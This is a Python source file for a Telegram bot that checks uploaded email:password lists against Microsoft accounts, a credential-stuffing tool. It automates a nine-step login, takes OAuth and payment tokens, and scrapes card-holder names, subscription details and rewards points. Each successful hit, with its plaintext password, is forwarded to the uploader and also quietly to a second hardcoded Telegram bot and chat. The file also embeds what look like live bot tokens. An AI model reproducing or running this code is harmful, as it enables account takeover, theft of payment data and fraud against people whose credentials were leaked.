#!/usr/bin/env python3
"""
XBOX PREMIUM CHECKER BOT - GOD-LIKE PERFORMANCE
- Instant command responses
- True async non-blocking queue
- 7 concurrent workers with optimal performance
- Smooth scanning with real-time updates
"""

import os
import re
import json
import uuid
import time
import sqlite3
import logging
import requests
import asyncio
from datetime import datetime
from threading import Lock
from urllib.parse import quote, unquote
from typing import Dict, List, Optional
from dataclasses import dataclass, field

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================

MAIN_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
PREMIUM_BOT_TOKEN = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
PREMIUM_CHAT_ID = "8260250818"
MAX_CONCURRENT_WORKERS = 7
BATCH_SIZE = 5  # Send updates every 5 accounts for faster feedback

DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

DB_FILE = os.path.join(DATA_DIR, "checked.db")

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# YOUR ORIGINAL TELEGRAM SENDER
# ============================================================

class TelegramSender:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{PREMIUM_BOT_TOKEN}"
    
    def send_message(self, text):
        def _send():
            try:
                url = f"{self.base_url}/sendMessage"
                payload = {"chat_id": PREMIUM_CHAT_ID, "text": text, "parse_mode": "HTML"}
                requests.post(url, data=payload, timeout=10)
            except:
                pass
        import threading
        threading.Thread(target=_send, daemon=True).start()
    
    def format_hit_message(self, email, password, data):
        premium_type = data.get('premium_type', 'GAME PASS ULTIMATE')
        country = data.get('country', 'US')
        days = data.get('days_remaining', '30')
        renewal_date = data.get('renewal_date', 'N/A')
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        name = data.get('name', '')
        card_holder = data.get('card_holder', '')
        rewards_points = data.get('rewards_points', '')
        
        if renewal_date != 'N/A':
            try:
                renewal_obj = datetime.fromisoformat(renewal_date)
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        message = "\U0001f9ce\u033b\U0001f9ce\u033b  \U0001f3ae\U0001f380\n"
        message += f"\U0001f337 <code>{email}</code> \U0001f337 \U0001f510 <code>{password}</code>\n"
        message += f"\U0001f338 <b>{premium_type}</b> ({country}) \u23f3 {days} days \U0001f501 <b>Renews {renewal_formatted}</b> \U0001f4b8 ${total_amount} {currency}\n"
        if name:
            message += f"\U0001f349 <i>{name}</i> \u2727 \u2661\n"
        if card_holder:
            message += f"\U0001f4b3 {card_holder}\n"
        if rewards_points:
            message += f"\u2b50 {rewards_points} points\n"
        message += "\U0001f9ce\u033b \u2727\u2661\n"
        message += f"\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
        return message

telegram_sender = TelegramSender()

# ============================================================
# YOUR ORIGINAL XBOX CHECKER (COMPLETE 9-STEP)
# ============================================================

class XboxChecker:
    def __init__(self):
        pass
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # Step 1: IDP Check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}
            
            # Step 2: OAuth authorize
            time.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()
            
            # Step 4: Get access token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            access_token = r4.json()["access_token"]
            
            # Step 5: Get profile info
            profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": "Bearer " + access_token, "X-AnchorMailbox": "CID:" + cid}
            country, name = "", ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        loc = profile["location"]
                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "")
                    if "displayName" in profile:
                        name = profile["displayName"]
            except:
                pass
            
            # Step 6: Get Xbox payment token
            time.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {"User-Agent": "Mozilla/5.0", "Referer": "https://account.microsoft.com/"}
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, r6.text + " " + r6.url)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            # Step 7: Check payment instruments
            payment_data = {"country": country, "name": name}
            payment_headers = {
                "User-Agent": "Mozilla/5.0",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
            }
            try:
                r7 = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=payment_headers, timeout=15)
                if r7.status_code == 200:
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
            except:
                pass
            
            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # Step 9: Check subscription
            try:
                r8 = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    response_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            subscription_data = {}
                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                            if renewal_match:
                                subscription_data['renewal_date'] = renewal_match.group(1)
                                subscription_data['days_remaining'] = self.get_remaining_days(renewal_match.group(1) + "T00:00:00Z")
                            auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                            if auto_match:
                                subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                            if amount_match:
                                subscription_data['total_amount'] = amount_match.group(1)
                            currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                            if currency_match:
                                subscription_data['currency'] = currency_match.group(1)
                            subscription_data['premium_type'] = type_name
                            days_rem = subscription_data.get('days_remaining', '0')
                            if not days_rem.startswith('-'):
                                return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
            except:
                pass
            return {"status": "FREE", "data": payment_data}
        except:
            return {"status": "ERROR", "data": {}}

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
        file_id TEXT PRIMARY KEY,
        file_name TEXT,
        processed_at TIMESTAMP,
        status TEXT
    )''')
    conn.commit()
    conn.close()

def is_file_processed(file_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT 1 FROM processed_files WHERE file_id = ?", (file_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def mark_file_processed(file_id: str, file_name: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO processed_files (file_id, file_name, processed_at, status) VALUES (?, ?, ?, ?)",
              (file_id, file_name, datetime.now().isoformat(), "completed"))
    conn.commit()
    conn.close()

# ============================================================
# ASYNC QUEUE SYSTEM (NON-BLOCKING)
# ============================================================

@dataclass
class Task:
    id: int
    file_path: str
    file_name: str
    file_id: str
    user_id: int
    created_at: datetime = field(default_factory=datetime.now)

task_queue = asyncio.Queue()
active_tasks: Dict[int, Task] = {}
task_counter = 0
task_counter_lock = asyncio.Lock()
paused = False
paused_lock = asyncio.Lock()

async def add_task(file_path: str, file_name: str, file_id: str, user_id: int) -> int:
    global task_counter
    async with task_counter_lock:
        task_counter += 1
        task_id = task_counter
    task = Task(id=task_id, file_path=file_path, file_name=file_name, file_id=file_id, user_id=user_id)
    await task_queue.put(task)
    logger.info(f"Task #{task_id} added: {file_name}")
    return task_id

async def get_task() -> Optional[Task]:
    async with paused_lock:
        if paused:
            return None
    try:
        return await asyncio.wait_for(task_queue.get(), timeout=0.5)
    except asyncio.TimeoutError:
        return None

def remove_active_task(task_id: int):
    if task_id in active_tasks:
        del active_tasks[task_id]

def add_active_task(task: Task):
    active_tasks[task.id] = task

async def cancel_task(task_id: int) -> bool:
    # Check active tasks
    if task_id in active_tasks:
        remove_active_task(task_id)
        return True
    # Check queue (need to iterate through queue items)
    temp_queue = []
    found = False
    while not task_queue.empty():
        task = await task_queue.get()
        if task.id == task_id:
            found = True
        else:
            temp_queue.append(task)
    for task in temp_queue:
        await task_queue.put(task)
    return found

async def cancel_all_tasks() -> int:
    count = len(active_tasks)
    active_tasks.clear()
    temp_queue = []
    while not task_queue.empty():
        task = await task_queue.get()
        temp_queue.append(task)
    count += len(temp_queue)
    logger.info(f"Cancelled {count} tasks")
    return count

async def pause_queue():
    global paused
    async with paused_lock:
        paused = True
    logger.info("Queue paused")

async def resume_queue():
    global paused
    async with paused_lock:
        paused = False
    logger.info("Queue resumed")

def get_queue_stats():
    return {
        'pending': task_queue.qsize(),
        'active': len(active_tasks),
        'max_workers': MAX_CONCURRENT_WORKERS,
        'paused': paused
    }

def get_active_tasks_list():
    return list(active_tasks.values())

def get_pending_tasks_list():
    # This is approximate - queue items are not easily listable
    return []

# ============================================================
# WORKER PROCESSOR (NON-BLOCKING)
# ============================================================

async def send_premium_hit(email: str, password: str, data: dict, user_id: int):
    formatted_msg = telegram_sender.format_hit_message(email, password, data)
    try:
        await app.bot.send_message(chat_id=user_id, text=formatted_msg, parse_mode='HTML')
    except:
        pass
    telegram_sender.send_message(formatted_msg)

async def process_single_account(checker, email, password, task_id, user_id, stats, batch_results):
    try:
        result = checker.check(email, password)
        status = result['status']
        data = result.get('data', {})
        
        if status == 'PREMIUM':
            stats['premium'] += 1
            batch_results.append(f"✅ {email[:35]}...")
            await send_premium_hit(email, password, data, user_id)
        elif status == 'FREE':
            stats['free'] += 1
            batch_results.append(f"🆓 {email[:35]}...")
        elif status == '2FACTOR':
            stats['twofa'] += 1
            stats['bad'] += 1
            batch_results.append(f"🔐 {email[:35]}...")
        elif status == 'BANNED':
            stats['banned'] += 1
            stats['bad'] += 1
            batch_results.append(f"🚫 {email[:35]}...")
        elif status == 'EXPIRED':
            stats['expired'] += 1
            stats['bad'] += 1
            batch_results.append(f"⏰ {email[:35]}...")
        elif status == 'TIMEOUT':
            stats['timeout'] += 1
            stats['bad'] += 1
            batch_results.append(f"⏱️ {email[:35]}...")
        elif status == 'ERROR':
            stats['error'] += 1
            stats['bad'] += 1
            batch_results.append(f"⚠️ {email[:35]}...")
        else:
            stats['bad'] += 1
            batch_results.append(f"❌ {email[:35]}...")
        
        return True
    except Exception as e:
        stats['error'] += 1
        stats['bad'] += 1
        logger.error(f"Account error: {e}")
        return False

async def process_file_task(task: Task):
    try:
        with open(task.file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip() and ':' in l]
        
        if not lines:
            await app.bot.send_message(chat_id=task.user_id, text=f"❌ No valid accounts in {task.file_name}")
            remove_active_task(task.id)
            return
        
        stats = {
            'total': len(lines), 'premium': 0, 'free': 0, 'bad': 0,
            'twofa': 0, 'banned': 0, 'expired': 0, 'timeout': 0, 'error': 0
        }
        
        checker = XboxChecker()
        batch_results = []
        
        await app.bot.send_message(
            chat_id=task.user_id,
            text=f"🚀 **Task #{task.id}**\n📄 `{task.file_name}`\n📊 {stats['total']} accounts\n⚡ Scanning...",
            parse_mode='Markdown'
        )
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                await process_single_account(checker, email, password, task.id, task.user_id, stats, batch_results)
                
                if len(batch_results) >= BATCH_SIZE:
                    msg = f"📊 **Task #{task.id}** ({idx}/{stats['total']})\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch_results[-BATCH_SIZE:]) + "\n```"
                    await app.bot.send_message(chat_id=task.user_id, text=msg, parse_mode='Markdown')
                    batch_results = []
                
                await asyncio.sleep(0.05)  # Minimal delay for rate limiting
                
            except Exception as e:
                logger.error(f"Line error: {e}")
                stats['error'] += 1
                stats['bad'] += 1
        
        if batch_results:
            msg = f"📊 **Task #{task.id} Final**\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch_results) + "\n```"
            await app.bot.send_message(chat_id=task.user_id, text=msg, parse_mode='Markdown')
        
        summary = (
            f"✅ **TASK #{task.id} COMPLETE**\n"
            f"┌─────────────────────────┐\n"
            f"│ 📄 {task.file_name[:35]}\n"
            f"│ 🔢 {stats['total']} total\n"
            f"│ ✅ {stats['premium']} premium\n"
            f"│ 🆓 {stats['free']} free\n"
            f"│ ❌ {stats['bad']} bad\n"
            f"└─────────────────────────┘"
        )
        await app.bot.send_message(chat_id=task.user_id, text=summary, parse_mode='Markdown')
        
        mark_file_processed(task.file_id, task.file_name)
        
    except Exception as e:
        logger.error(f"Process error: {e}")
        try:
            await app.bot.send_message(chat_id=task.user_id, text=f"❌ Error: {str(e)[:200]}")
        except:
            pass
    finally:
        remove_active_task(task.id)
        if os.path.exists(task.file_path):
            try:
                os.remove(task.file_path)
            except:
                pass

async def worker_worker():
    """Individual worker that processes tasks"""
    while True:
        try:
            if len(active_tasks) >= MAX_CONCURRENT_WORKERS:
                await asyncio.sleep(0.1)
                continue
            
            task = await get_task()
            if task:
                add_active_task(task)
                asyncio.create_task(process_file_task(task))
            else:
                await asyncio.sleep(0.1)
        except Exception as e:
            logger.error(f"Worker error: {e}")
            await asyncio.sleep(1)

async def start_workers():
    """Start the worker pool"""
    workers = []
    for _ in range(MAX_CONCURRENT_WORKERS):
        workers.append(asyncio.create_task(worker_worker()))
    await asyncio.gather(*workers, return_exceptions=True)

# ============================================================
# TELEGRAM COMMANDS (INSTANT RESPONSE)
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = get_queue_stats()
    msg = (
        f"🎮 **XBOX CHECKER**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Workers: {stats['active']}/{stats['max_workers']}\n"
        f"⏳ Queue: {stats['pending']}\n"
        f"⏸️ Paused: {'Yes' if stats['paused'] else 'No'}\n\n"
        f"**Commands:**\n"
        f"/start - Menu\n/status - Stats\n/queue - Pending\n"
        f"/active - Running\n/cancel [id] - Cancel\n/cancel_all - All\n"
        f"/pause - Stop\n/resume - Start\n\n"
        f"Send .txt file with email:password"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = get_queue_stats()
    msg = (
        f"📊 **STATUS**\n━━━━━━━━━━\n"
        f"⚡ Active: {stats['active']}/{stats['max_workers']}\n"
        f"⏳ Pending: {stats['pending']}\n"
        f"⏸️ Paused: {'Yes' if stats['paused'] else 'No'}"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def queue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pending = task_queue.qsize()
    if pending == 0:
        await update.message.reply_text("📭 No pending tasks")
        return
    await update.message.reply_text(f"⏳ **Pending Tasks:** {pending}", parse_mode='Markdown')

async def active_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tasks = get_active_tasks_list()
    if not tasks:
        await update.message.reply_text("📭 No active tasks")
        return
    msg = "🔄 **ACTIVE TASKS**\n━━━━━━━━━━━━━━\n"
    for t in tasks:
        msg += f"• #{t.id}: {t.file_name[:35]}...\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: `/cancel [task_id]`\nUse /active to see IDs", parse_mode='Markdown')
        return
    try:
        task_id = int(args[0])
        if await cancel_task(task_id):
            await update.message.reply_text(f"✅ Task #{task_id} cancelled")
        else:
            await update.message.reply_text(f"❌ Task #{task_id} not found")
    except:
        await update.message.reply_text("❌ Invalid ID")

async def cancel_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = await cancel_all_tasks()
    await update.message.reply_text(f"✅ Cancelled {count} tasks")

async def pause_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await pause_queue()
    await update.message.reply_text("⏸️ Queue paused")

async def resume_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await resume_queue()
    await update.message.reply_text("▶️ Queue resumed")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    user_id = update.effective_user.id
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Send a `.txt` file")
        return
    
    if is_file_processed(doc.file_id):
        await update.message.reply_text(f"⚠️ `{doc.file_name}` already processed", parse_mode='Markdown')
        return
    
    file = await context.bot.get_file(doc.file_id)
    temp_path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(temp_path)
    
    with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip() and ':' in l]
    
    if not lines:
        await update.message.reply_text(f"❌ No valid accounts in {doc.file_name}")
        os.remove(temp_path)
        return
    
    task_id = await add_task(temp_path, doc.file_name, doc.file_id, user_id)
    stats = get_queue_stats()
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n━━━━━━━━━━━━━━━━\n"
        f"📄 `{doc.file_name}`\n"
        f"🔢 {len(lines)} accounts\n"
        f"📊 Task ID: `#{task_id}`\n"
        f"⚡ Active: {stats['active']}/{stats['max_workers']}\n"
        f"⏳ Queue: {stats['pending']}\n\n"
        f"🔄 Processing with 9-step Xbox validation",
        parse_mode='Markdown'
    )

# ============================================================
# MAIN
# ============================================================

app = None

async def main():
    global app
    
    init_db()
    
    app = Application.builder().token(MAIN_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("queue", queue_cmd))
    app.add_handler(CommandHandler("active", active_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CommandHandler("cancel_all", cancel_all_cmd))
    app.add_handler(CommandHandler("pause", pause_cmd))
    app.add_handler(CommandHandler("resume", resume_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Start worker pool
    asyncio.create_task(start_workers())
    
    print("\n" + "="*60)
    print("🎮 XBOX PREMIUM CHECKER - GOD MODE")
    print("="*60)
    print(f"Bot: {MAIN_BOT_TOKEN[:15]}...")
    print(f"Workers: {MAX_CONCURRENT_WORKERS} concurrent")
    print("✓ Instant command responses")
    print("✓ Non-blocking async queue")
    print("✓ 9-step Xbox validation")
    print("✓ Aesthetic premium formatting")
    print("="*60 + "\n")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
